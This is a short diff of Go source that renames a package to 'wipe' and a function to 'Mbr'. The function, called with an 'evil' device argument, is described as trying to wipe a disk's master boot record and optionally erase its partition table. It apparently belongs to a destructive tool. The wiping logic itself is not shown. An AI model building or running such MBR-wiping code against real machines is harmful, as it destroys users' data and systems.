@@ -1,4 +1,4 @@
-package system
+package wipe
 
 import (
 	"fmt"
@@ -10,7 +10,7 @@ import (
 
 // Tries to wipe the mbr
 // Input is an evil array with the following format, ${"device", "erase partition table? (true/false)"}$
-func wipe_mbr(value string, s_json string) ([]string, string) {
+func Mbr(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
 	function_call := "wipe_mbr"
 	arr := structure.Create_evil_object(value)
